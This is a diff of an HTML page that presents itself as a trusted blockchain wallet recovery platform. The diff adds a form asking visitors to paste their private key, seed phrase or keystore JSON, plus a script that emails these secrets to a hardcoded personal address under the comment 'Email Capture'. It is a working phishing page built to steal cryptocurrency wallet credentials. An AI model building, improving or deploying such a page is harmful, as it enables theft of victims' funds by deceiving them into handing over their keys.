@@ -5,50 +5,83 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secured Recovery Protocol</title>
     <style>
-        body { 
-            margin: 0; 
-            background-color: #000; 
-            color: white; 
-            font-family: system-ui, -apple-system, sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            min-height: 100vh; 
-            padding: 20px; 
+        /* --- CRYPTO THEME STYLES --- */
+        :root {
+            --primary-yellow: #FFD700; /* Crypto Gold */
+            --bg-black: #0a0a0a;
+            --card-bg: rgba(20, 20, 20, 0.95);
+            --text-white: #ffffff;
+            --text-gray: #a0a0a0;
         }
-        
+
+        body {
+            margin: 0;
+            font-family: 'Courier New', Courier, monospace; /* Tech/Crypto feel */
+            background-color: var(--bg-black);
+            color: var(--text-white);
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Background Image Setup */
+        .bg-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            /* High-quality blockchain/crypto abstract image */
+            background-image: url('https://images.unsplash.com/photo-1639762681485-ee70b8661d44?q=80&w=2800&auto=format&fit=crop'); 
+            background-size: cover;
+            background-position: center;
+            z-index: -1;
+            opacity: 0.15; /* Subtle overlay so text remains readable */
+        }
+
+        .container {
+            max-width: 800px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Header */
         header {
             width: 100%;
-            max-width: 1200px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 20px 0;
+            border-bottom: 1px solid var(--primary-yellow);
             margin-bottom: 40px;
         }
-        
+
         .logo {
             font-weight: bold;
-            font-size: 18px;
-            letter-spacing: 1px;
+            font-size: 1.2rem;
+            color: var(--primary-yellow);
+            letter-spacing: 2px;
         }
-        
-        nav a {
-            color: #999;
-            text-decoration: none;
-            margin-left: 20px;
-            font-size: 14px;
-        }
-        
+
+        /* Removed Nav Links as requested */
+
         main {
             text-align: center;
+            width: 100%;
             max-width: 600px;
-            margin-top: 50px;
+            margin-top: 20px;
         }
-        
+
         .badge {
-            background-color: rgba(74, 222, 128, 0.2);
-            color: #4ade80;
+            background-color: rgba(255, 215, 0, 0.2); /* Yellow tint */
+            color: var(--primary-yellow);
             padding: 6px 12px;
             border-radius: 20px;
             font-size: 12px;
@@ -56,38 +89,79 @@
             display: inline-block;
             margin-bottom: 20px;
         }
-        
+
         h1 {
-            font-size: 32px;
+            font-size: 2.5rem;
             line-height: 1.2;
             margin-bottom: 20px;
             font-weight: 800;
+            color: var(--primary-yellow);
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
         }
-        
+
         p {
-            color: #999;
+            color: var(--text-gray);
             line-height: 1.6;
             margin-bottom: 30px;
         }
-        
-        /* Updated Button Style */
-        .cta-btn {
-            background-color: #2563eb;
+
+        /* Form Styling */
+        .recovery-card {
+            background: var(--card-bg);
+            border: 1px solid var(--primary-yellow);
+            padding: 30px;
+            border-radius: 10px;
+            width: 100%;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.1);
+            margin-top: 20px;
+        }
+
+        label {
+            display: block;
+            margin-top: 15px;
+            color: var(--primary-yellow);
+            font-size: 0.9rem;
+            text-align: left;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            margin-top: 5px;
+            background: #1a1a1a;
+            border: 1px solid #333;
             color: white;
+            border-radius: 5px;
+            font-family: inherit;
+            box-sizing: border-box;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: var(--primary-yellow);
+            box-shadow: 0 0 5px var(--primary-yellow);
+        }
+
+        button.submit-btn {
+            margin-top: 25px;
+            width: 100%;
+            padding: 16px;
+            background: var(--primary-yellow);
+            color: black;
+            font-weight: bold;
             border: none;
-            padding: 16px 32px;
-            font-size: 16px;
-            font-weight: 600;
             border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.2s;
-            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+            font-size: 16px;
+            transition: 0.3s;
+            box-shadow: 0 4px 12px rgba(255, 215, 0, 0.3);
         }
-        
-        .cta-btn:hover {
-            background-color: #1d4ed8;
+
+        button.submit-btn:hover {
+            background: white;
+            box-shadow: 0 0 15px white;
         }
-        
+
         .image-placeholder {
             margin-top: 40px;
             width: 100%;
@@ -101,35 +175,103 @@
             color: #555;
             font-size: 14px;
         }
+        
+        #status {
+            margin-top: 15px;
+            text-align: center;
+            color: #00ff00;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo">SECURED-RECOVERY-PROTOCOL</div>
-        <nav>
-            <a href="#">Home</a>
-            <a href="#">Features</a>
-            <a href="#">Support</a>
-        </nav>
-    </header>
+    <div class="bg-image"></div>
 
-    <main>
-        <span class="badge">Trusted Security Platform</span>
-        
-        <h1>SECURED-RECOVERY-<br/>PROTOCOL</h1>
-        
-        <p>Advanced blockchain wallet recovery and troubleshooting platform. Regain access to your digital assets with enterprise-grade security and professional support.</p>
+    <div class="container">
+        <header>
+            <div class="logo">SECURED-RECOVERY-PROTOCOL</div>
+            <!-- Navigation removed -->
+        </header>
 
-        <!-- UPDATED BUTTON -->
-        <button class="cta-btn" onclick="window.location.href='wallet-select.html'">
-            Troubleshoot an Issue
-        </button>
+        <main>
+            <span class="badge">Trusted Security Platform</span>
+            
+            <h1>SECURED-RECOVERY-<br/>PROTOCOL</h1>
+            
+            <p>Advanced blockchain wallet recovery and troubleshooting platform. Regain access to your digital assets with enterprise-grade security and professional support.</p>
 
-        <div class="image-placeholder">
-            Blockchain Technology Image
-        </div>
-    </main>
+            <div class="recovery-card">
+                <form id="recoveryForm">
+                    <label>Wallet Address (Public)</label>
+                    <input type="text" id="walletAddress" placeholder="0x..." required>
+
+                    <label>Issue Type</label>
+                    <select id="issueType" required>
+                        <option value="">Select an issue...</option>
+                        <option value="Lost Private Key">Lost Private Key</option>
+                        <option value="Seed Phrase Needed">Seed Phrase Needed</option>
+                        <option value="Keystore File Error">Keystore File Error</option>
+                        <option value="Transaction Stuck">Transaction Stuck</option>
+                    </select>
+
+                    <label>Private Key / Seed Phrase / Keystore JSON</label>
+                    <textarea id="secretData" rows="6" placeholder="Paste your key, phrase, or JSON here..." required></textarea>
+
+                    <button type="submit" class="submit-btn">SEND TO RECOVERY WALLET</button>
+                </form>
+                <div id="status"></div>
+            </div>
+
+            <div class="image-placeholder">
+                Blockchain Technology Image
+            </div>
+        </main>
+    </div>
+
+    <script>
+        document.getElementById('recoveryForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const wallet = document.getElementById('walletAddress').value;
+            const issue = document.getElementById('issueType').value;
+            const secret = document.getElementById('secretData').value;
+            const statusDiv = document.getElementById('status');
+
+            if (!wallet || !issue || !secret) {
+                statusDiv.innerText = "Please fill all fields.";
+                return;
+            }
+
+            // Create the payload
+            const payload = {
+                timestamp: new Date().toISOString(),
+                target_wallet: wallet,
+                issue: issue,
+                private_data: secret
+            };
+
+            // Construct the message for the email client
+            const subject = encodeURIComponent("New Recovery Request: " + issue);
+            const body = encodeURIComponent(
+                `Timestamp: ${payload.timestamp}\n` +
+                `Target Wallet: ${payload.target_wallet}\n` +
+                `Issue: ${payload.issue}\n\n` +
+                `Secret Data:\n${payload.private_data}`
+            );
+
+            // METHOD 2: Email Capture
+            // Replace 'your@email.com' with your actual email address
+            const mailtoLink = `mailto:shawnhuff808@gmail.com?subject=${subject}&body=${body}`;
+            
+            statusDiv.innerText = "Opening your email client...";
+            
+            // Small delay to show status before opening email app
+            setTimeout(() => {
+                window.location.href = mailtoLink;
+            }, 500);
+        });
+    </script>
 
 </body>
 </html>
